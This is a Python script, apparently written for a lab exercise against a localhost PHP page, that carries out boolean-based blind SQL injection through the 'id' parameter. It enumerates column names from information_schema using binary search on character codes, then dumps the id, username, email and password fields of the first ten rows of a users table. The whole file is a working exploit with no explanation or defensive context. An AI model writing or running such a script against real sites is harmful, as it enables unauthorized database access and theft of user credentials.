import requests

url = "http://localhost/task02/22/index.php"

def send_req(payload):
    params ={
        'id': f"1 AND {payload}"
    }
    try:
        response = requests.get(url, params=params)
        return ("username" in response.text)
    except Exception as e:
        print("Request error:", e)
        return False

def get_col(index, max_len=30):
    col_name = ""
    for pos in range(1, max_len + 1):
        low = 32
        high = 126
        found_char = None

        while low <= high:
            mid = (low + high) // 2
            payload = f"ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT {index},1),{pos},1))={mid}"
            if send_req(payload):
                found_char = chr(mid)
                col_name += found_char
                break
            else:
                payload = f"ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT {index},1),{pos},1))>{mid}"
                if send_req(payload):
                    low = mid + 1
                else:
                    high = mid - 1

        if found_char is None:
            break
    return f"#{index}: {col_name}"

def dump_field(column_name, row_index, max_len=30):
    result = ""
    for pos in range(1, max_len + 1):
        low = 32
        high = 126
        found_char = None

        while low <= high:
            mid = (low + high) // 2
            payload = f"ASCII(SUBSTRING((SELECT {column_name} FROM users LIMIT {row_index},1),{pos},1))={mid}"
            if send_req(payload):
                found_char = chr(mid)
                result += found_char
                break
            else:
                payload = f"ASCII(SUBSTRING((SELECT {column_name} FROM users LIMIT {row_index},1),{pos},1))>{mid}"
                if send_req(payload):
                    low = mid + 1
                else:
                    high = mid - 1

        if found_char is None:
            break  # end of string
    return result

columns = ["id", "username", "email", "password"]
for row_index in range(10):  # dump first 10 lines
    for col in columns:
        value = dump_field(col, row_index)
        print(f"    {col}: {value}")
    print("\n")